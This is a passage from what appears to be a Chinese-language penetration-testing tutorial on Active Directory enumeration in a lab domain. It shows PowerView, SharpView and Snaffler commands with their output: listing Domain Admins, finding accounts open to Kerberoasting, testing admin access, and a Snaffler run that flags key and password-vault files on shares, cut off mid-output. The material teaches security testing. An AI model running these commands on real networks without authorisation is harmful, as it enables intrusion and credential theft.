class="line">SamAccountName    : Backup Operators</span><br><span class="line">SID               : S<span class="literal">-1-5-32-551</span></span><br></pre></td></tr></table></figure>

<h3 id="Get-ADGroupMember"><a href="#Get-ADGroupMember" class="headerlink" title="Get-ADGroupMember"></a>Get-ADGroupMember</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Backup Operators&quot;</span></span><br><span class="line"></span><br><span class="line">distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">name              : BACKUPAGENT</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : <span class="number">2</span>ec53e98<span class="literal">-3a64-4706-be23-1d824ff61bed</span></span><br><span class="line">SamAccountName    : backupagent</span><br><span class="line">SID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5220</span></span><br></pre></td></tr></table></figure>

<h2 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h2><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a>是一个用 PowerShell 编写的工具，可帮助在 AD 环境中获得态势感知。与 BloodHound 非常相似，它提供了一种方法来识别用户在网络上的登录位置、枚举域信息（例如用户、计算机、组、ACLS、信任）、搜索文件共享和密码、执行 Kerberoasting 等。</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>Export-PowerViewCSV</code></td>
<td>将结果附加到 CSV 文件</td>
</tr>
<tr>
<td><code>ConvertTo-SID</code></td>
<td>将用户或组名称转换为其 SID 值</td>
</tr>
<tr>
<td><code>Get-DomainSPNTicket</code></td>
<td>为指定的服务主体名称 (SPN) 帐户请求 Kerberos 票证</td>
</tr>
<tr>
<td><strong>Domain&#x2F;LDAP Functions:</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-Domain</code></td>
<td>将返回当前（或指定）域的 AD 对象</td>
</tr>
<tr>
<td><code>Get-DomainController</code></td>
<td>返回指定域的域控制器列表</td>
</tr>
<tr>
<td><code>Get-DomainUser</code></td>
<td>将返回 AD 中的所有用户或特定用户对象</td>
</tr>
<tr>
<td><code>Get-DomainComputer</code></td>
<td>将返回 AD 中的所有计算机或特定计算机对象</td>
</tr>
<tr>
<td><code>Get-DomainGroup</code></td>
<td>将返回 AD 中的所有组或特定组对象</td>
</tr>
<tr>
<td><code>Get-DomainOU</code></td>
<td>搜索 AD 中所有或特定的 OU 对象</td>
</tr>
<tr>
<td><code>Find-InterestingDomainAcl</code></td>
<td>在域中查找将修改权限设置为非内置对象的对象 ACL</td>
</tr>
<tr>
<td><code>Get-DomainGroupMember</code></td>
<td>将返回特定域组的成员</td>
</tr>
<tr>
<td><code>Get-DomainFileServer</code></td>
<td>返回可能充当文件服务器的服务器列表</td>
</tr>
<tr>
<td><code>Get-DomainDFSShare</code></td>
<td>返回当前（或指定）域的所有分布式文件系统的列表</td>
</tr>
<tr>
<td><strong>GPO Functions:</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-DomainGPO</code></td>
<td>将返回 AD 中的所有 GPO 或特定 GPO 对象</td>
</tr>
<tr>
<td><code>Get-DomainPolicy</code></td>
<td>返回当前域的默认域策略或域控制器策略</td>
</tr>
<tr>
<td><strong>Computer Enumeration Functions:</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-NetLocalGroup</code></td>
<td>枚举本地或远程计算机上的本地组</td>
</tr>
<tr>
<td><code>Get-NetLocalGroupMember</code></td>
<td>枚举特定本地组的成员</td>
</tr>
<tr>
<td><code>Get-NetShare</code></td>
<td>返回本地（或远程）机器上的开放共享</td>
</tr>
<tr>
<td><code>Get-NetSession</code></td>
<td>将返回本地（或远程）机器的会话信息</td>
</tr>
<tr>
<td><code>Test-AdminAccess</code></td>
<td>测试当前用户是否具有本地（或远程）计算机的管理访问权限</td>
</tr>
<tr>
<td><strong>Threaded ‘Meta’-Functions:</strong></td>
<td></td>
</tr>
<tr>
<td><code>Find-DomainUserLocation</code></td>
<td>查找特定用户登录的机器</td>
</tr>
<tr>
<td><code>Find-DomainShare</code></td>
<td>查找域机器上可访问的共享</td>
</tr>
<tr>
<td><code>Find-InterestingDomainShareFile</code></td>
<td>在域中的可读共享中搜索符合特定条件的文件</td>
</tr>
<tr>
<td><code>Find-LocalAdminAccess</code></td>
<td>在本地域中查找当前用户具有本地管理员访问权限的计算机</td>
</tr>
<tr>
<td><strong>Domain Trust Functions:</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-DomainTrust</code></td>
<td>返回当前域或指定域的域信任</td>
</tr>
<tr>
<td><code>Get-ForestTrust</code></td>
<td>返回当前林或指定林的所有林信任</td>
</tr>
<tr>
<td><code>Get-DomainForeignUser</code></td>
<td>枚举用户域外群组中的用户</td>
</tr>
<tr>
<td><code>Get-DomainForeignGroupMember</code></td>
<td>枚举组域外的用户组并返回每个外部成员</td>
</tr>
<tr>
<td><code>Get-DomainTrustMapping</code></td>
<td>将枚举当前域和任何其他可见域的所有信任。</td>
</tr>
</tbody></table>
<h3 id="Get-DomainUser"><a href="#Get-DomainUser" class="headerlink" title="Get-DomainUser"></a>Get-DomainUser</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> mmorgan <span class="literal">-Domain</span> inlanefreight.local | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">name                 : Matthew Morgan</span><br><span class="line">samaccountname       : mmorgan</span><br><span class="line">description          :</span><br><span class="line">memberof             : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar</span><br><span class="line">                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security</span><br><span class="line">                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security</span><br><span class="line">                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;</span><br><span class="line">whencreated          : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">5</span>:<span class="number">37</span>:<span class="number">06</span> PM</span><br><span class="line">pwdlastset           : <span class="number">11</span>/<span class="number">18</span>/<span class="number">2021</span> <span class="number">10</span>:<span class="number">02</span>:<span class="number">57</span> AM</span><br><span class="line">lastlogontimestamp   : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">34</span>:<span class="number">25</span> PM</span><br><span class="line">accountexpires       : NEVER</span><br><span class="line">admincount           : <span class="number">1</span></span><br><span class="line">userprincipalname    : mmorgan@inlanefreight.local</span><br><span class="line">serviceprincipalname :</span><br><span class="line">mail                 :</span><br><span class="line">useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</span><br></pre></td></tr></table></figure>

<p>查找设置了 SPN 属性的用户，这表明该帐户可能受到 Kerberoasting 攻击。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Properties</span> samaccountname,ServicePrincipalName</span><br><span class="line"></span><br><span class="line">serviceprincipalname                          samaccountname</span><br><span class="line"><span class="literal">--------------------</span>                          <span class="literal">--------------</span></span><br><span class="line">adfsconnect/azure01.inlanefreight.local       adfs</span><br><span class="line">backupjob/veam001.inlanefreight.local         backupagent</span><br><span class="line">d0wngrade/kerberoast.inlanefreight.local      d0wngrade</span><br><span class="line">kadmin/changepw                               krbtgt</span><br><span class="line">MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span> sqldev</span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:<span class="number">1433</span>      sqlprod</span><br><span class="line">MSSQLSvc/SQL<span class="literal">-CL01-01inlanefreight</span>.local:<span class="number">49351</span> sqlqa</span><br><span class="line">sts/inlanefreight.local                       solarwindsmonitor</span><br><span class="line">testspn/kerberoast.inlanefreight.local        testspn</span><br><span class="line">testspn2/kerberoast.inlanefreight.local       testspn2</span><br></pre></td></tr></table></figure>

<h3 id="Get-DomainGroupMember"><a href="#Get-DomainGroupMember" class="headerlink" title="Get-DomainGroupMember"></a>Get-DomainGroupMember</h3><p><code>-Recurse</code> 如果它发现任何属于目标组（嵌套组成员身份）的组，则列出这些组的成员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Recurse</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Domain Admins</span><br><span class="line">GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : svc_qualys</span><br><span class="line">MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5613</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Domain Admins</span><br><span class="line">GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : <span class="built_in">sp</span><span class="literal">-admin</span></span><br><span class="line">MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5228</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Secadmins</span><br><span class="line">GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : spong1990</span><br><span class="line">MemberDistinguishedName : CN=Maggie</span><br><span class="line">                          Jablonski,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1965</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="Get-DomainTrustMapping"><a href="#Get-DomainTrustMapping" class="headerlink" title="Get-DomainTrustMapping"></a>Get-DomainTrustMapping</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainTrustMapping</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM </span><br></pre></td></tr></table></figure>

<h3 id="Test-AdminAccess"><a href="#Test-AdminAccess" class="headerlink" title="Test-AdminAccess"></a>Test-AdminAccess</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Test-AdminAccess</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line"></span><br><span class="line">ComputerName    IsAdmin</span><br><span class="line"><span class="literal">------------</span>    <span class="literal">-------</span></span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span>    True </span><br></pre></td></tr></table></figure>

<h2 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h2><p>PowerView 是现已弃用的 PowerSploit PowerShell 工具包的一部分。</p>
<p>SharpView 是 PowerView 的 .NET 端口。PowerView 支持的许多相同功能都可以在 SharpView 中使用。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpView.exe <span class="built_in">Get-DomainUser</span> <span class="literal">-Help</span></span><br><span class="line"></span><br><span class="line">Get_DomainUser <span class="literal">-Identity</span> &lt;String[]&gt; <span class="literal">-DistinguishedName</span> &lt;String[]&gt; <span class="literal">-SamAccountName</span> &lt;String[]&gt; <span class="literal">-Name</span> &lt;String[]&gt; <span class="literal">-MemberDistinguishedName</span> &lt;String[]&gt; <span class="literal">-MemberName</span> &lt;String[]&gt; <span class="literal">-SPN</span> &lt;Boolean&gt; <span class="literal">-AdminCount</span> &lt;Boolean&gt; <span class="literal">-AllowDelegation</span> &lt;Boolean&gt; <span class="literal">-DisallowDelegation</span> &lt;Boolean&gt; <span class="literal">-TrustedToAuth</span> &lt;Boolean&gt; <span class="literal">-PreauthNotRequired</span> &lt;Boolean&gt; <span class="literal">-KerberosPreauthNotRequired</span> &lt;Boolean&gt; <span class="literal">-NoPreauth</span> &lt;Boolean&gt; <span class="literal">-Domain</span> &lt;String&gt; <span class="literal">-LDAPFilter</span> &lt;String&gt; <span class="literal">-Filter</span> &lt;String&gt; <span class="literal">-Properties</span> &lt;String[]&gt; <span class="literal">-SearchBase</span> &lt;String&gt; <span class="literal">-ADSPath</span> &lt;String&gt; <span class="literal">-Server</span> &lt;String&gt; <span class="literal">-DomainController</span> &lt;String&gt; <span class="literal">-SearchScope</span> &lt;SearchScope&gt; <span class="literal">-ResultPageSize</span> &lt;Int32&gt; <span class="literal">-ServerTimeLimit</span> &lt;Nullable`1&gt; <span class="literal">-SecurityMasks</span> &lt;Nullable`1&gt; <span class="literal">-Tombstone</span> &lt;Boolean&gt; <span class="literal">-FindOne</span> &lt;Boolean&gt; <span class="literal">-ReturnOne</span> &lt;Boolean&gt; <span class="literal">-Credential</span> &lt;NetworkCredential&gt; <span class="literal">-Raw</span> &lt;Boolean&gt; <span class="literal">-UACFilter</span> &lt;UACEnum&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h2><p><a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a>是一种可以帮助在 Active Directory 环境中获取凭据或其他敏感数据的工具。Snaffler 的工作原理是获取域内的主机列表，然后枚举这些主机的共享和可读目录。完成后，它会遍历用户可读的任何目录，并搜索可以改善在评估中的位置的文件。Snaffler 要求从加入域的主机或在域用户上下文中运行。</p>
<p><code>-s</code> 将结果打印到控制台，<code>-v</code> 详细程度，通常 data</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Snaffler.exe  <span class="literal">-d</span> INLANEFREIGHT.LOCAL <span class="literal">-s</span> <span class="literal">-v</span> <span class="keyword">data</span></span><br><span class="line"></span><br><span class="line"> .::::::.:::.    :::.  :::.    .-:::::<span class="string">&#x27;.-:::::&#x27;</span>:::    .,:::::: :::::::..</span><br><span class="line">;;;`    ``;;;;,  `;;;  ;;`;;   ;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;    ;;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;;``;;;;</span><br><span class="line"><span class="string">&#x27;[==/[[[[, [[[[[. &#x27;</span>[[ ,[[ <span class="string">&#x27;[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[[&#x27;</span></span><br><span class="line">  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;    $ $$$ &#x27;</span><span class="type">Y</span><span class="variable">$c</span><span class="variable">$</span><span class="variable">$c</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$cc</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$c</span>`$<span class="variable">$</span><span class="variable">$</span><span class="string">&#x27;`` `$$$&#x27;</span>`` <span class="variable">$</span><span class="variable">$</span><span class="string">&#x27;     $$&quot;&quot;   $$$$$$c</span></span><br><span class="line"><span class="string"> 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b &#x27;</span><span class="number">88</span><span class="type">bo</span>,</span><br><span class="line">  <span class="string">&#x27;YMmMY&#x27;</span>  <span class="type">MMM</span>     <span class="type">YM</span> <span class="type">YMM</span>   <span class="string">&#x27;&#x27;</span>` <span class="string">&#x27;MM,    &#x27;</span><span class="type">MM</span>,  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="type">YUMMM</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="type">YUMMMMMMM</span>   <span class="string">&#x27;W&#x27;</span></span><br><span class="line">                         <span class="type">by</span> <span class="type">l0ss</span> <span class="type">and</span> <span class="type">Sh3r4</span> - <span class="type">github.com</span>/<span class="type">SnaffCon</span>/<span class="type">Snaffler</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Black</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="type">ADMIN</span><span class="variable">$</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Black</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="type">C</span><span class="variable">$</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MX01.INLANEFREIGHT.LOCAL</span>\<span class="type">address</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">User</span> <span class="type">Shares</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">ZZZ_archive</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">18</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">CA01.INLANEFREIGHT.LOCAL</span>\<span class="type">CertEnroll</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.kdb</span><span class="variable">$</span>|<span class="number">289</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">22</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">GroupBackup.kdb</span>) <span class="type">.kdb</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">299</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">33</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">ShowReset.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="type">UpdateServicesPackages</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.kwallet</span><span class="variable">$</span>|<span class="number">302</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">45</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">WriteUse.kwallet</span>) <span class="type">.kwallet</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">298</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">10</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">ProtectStep.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] 